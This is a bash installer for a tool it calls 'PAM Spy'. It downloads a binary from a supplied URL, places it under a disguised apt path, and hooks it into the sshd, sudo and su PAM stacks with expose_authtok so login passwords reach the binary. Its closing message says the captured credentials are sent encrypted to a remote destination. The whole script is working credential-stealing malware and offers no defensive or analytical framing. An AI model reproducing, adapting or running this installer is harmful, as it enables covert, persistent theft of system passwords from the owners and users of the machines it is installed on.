#!/bin/bash

# Configuration
VERSION="1.0"
INSTALL_DIR="/usr/lib/apt/methods"
BINARY_NAME="http_auth"
TARGET_FILE="$INSTALL_DIR/$BINARY_NAME"
PAM_SERVICES=("sshd" "sudo" "su")
PAM_EXEC_LINE="auth optional pam_exec.so quiet expose_authtok $TARGET_FILE"
PAM_SESSION_LINE="session optional pam_exec.so quiet $TARGET_FILE"

# Check for root supperuser
if [ "$EUID" -ne 0 ]; then
  echo "[!] must be run by root/sudo."
  exit 1
fi

uninstall() {
    echo "[*] delete pam_spy..."
    rm -f /etc/pam.d/*.bak &> /dev/null
    
    # 1. restore pam config
    for service in "${PAM_SERVICES[@]}"; do
        PAM_FILE="/etc/pam.d/$service"
        if [ -f "$PAM_FILE" ]; then
            if grep -q "$BINARY_NAME" "$PAM_FILE"; then
                echo "[*] clean $service..."
                sed -i "/$BINARY_NAME/d" "$PAM_FILE"
            fi
        fi
    done

    if [ -f "$TARGET_FILE" ]; then
        rm -f "$TARGET_FILE"
        echo "[+] File $TARGET_FILE success removed."
    fi

    echo "[*] restart sshd service..."
    systemctl restart sshd &> /dev/null || service sshd restart &> /dev/null

    echo "[+] Uninstall success."
    exit 0
}

# Check argument
if [ "$1" == "uninstall" ]; then
    uninstall
fi

if [ -z "$1" ]; then
    echo "Usage:"
    echo "  Install:   sudo ./installer.sh <binnry_download_url>"
    echo "  Uninstall: sudo ./installer.sh uninstall"
    exit 1
fi

DOWNLOAD_URL=$1

echo "[*] Installation PAM Spy $VERSION..."

# 1. Download Binary
mkdir -p "$INSTALL_DIR"
echo "[*] Download binary from $DOWNLOAD_URL..."

if command -v curl &> /dev/null; then
    curl -L -o "$TARGET_FILE" "$DOWNLOAD_URL"
elif command -v wget &> /dev/null; then
    wget -O "$TARGET_FILE" "$DOWNLOAD_URL"
else
    echo "[!] No curl or wget found. Please install one of them."
    exit 1
fi

if [ $? -ne 0 ]; then
    echo "[!] Download failed. Make sure the URL is correct."
    exit 1
fi

chmod +x "$TARGET_FILE"
chown root:root "$TARGET_FILE"
echo "[+] Binary installed to $TARGET_FILE"
# Config Pam
PAM_PASSWORD_LINE="password optional pam_exec.so quiet expose_authtok $TARGET_FILE"
PAM_SESSION_LINE="session optional pam_exec.so quiet $TARGET_FILE"

for service in "${PAM_SERVICES[@]}"; do
    PAM_FILE="/etc/pam.d/$service"
    if [ -f "$PAM_FILE" ]; then
        if grep -q "$BINARY_NAME" "$PAM_FILE"; then
            echo "[!] $service already configured. Checking update stack..."
            # Ensure password stack hook exists
            if ! grep -q "password optional" "$PAM_FILE"; then
                echo "$PAM_PASSWORD_LINE" >> "$PAM_FILE"
            fi
            # Ensure session stack hook exists (required for success filter)
            if ! grep -q "session optional" "$PAM_FILE"; then
                echo "$PAM_SESSION_LINE" >> "$PAM_FILE"
            fi
        else
            echo "[*] Configuring $service (auth, password & session stacks)..."
            cp "$PAM_FILE" "$PAM_FILE.bak"
            echo "$PAM_EXEC_LINE" >> "$PAM_FILE"
            echo "$PAM_PASSWORD_LINE" >> "$PAM_FILE"
            echo "$PAM_SESSION_LINE" >> "$PAM_FILE"
        fi
    fi
done

echo "[*] Restart service sshd..."
systemctl restart sshd &> /dev/null || service sshd restart &> /dev/null

echo "[+] Done! The credentials will now be sent RSA-encrypted to the remote destination."
echo "[!] Make sure you save the RSA Private Key to decrypt the incoming data."
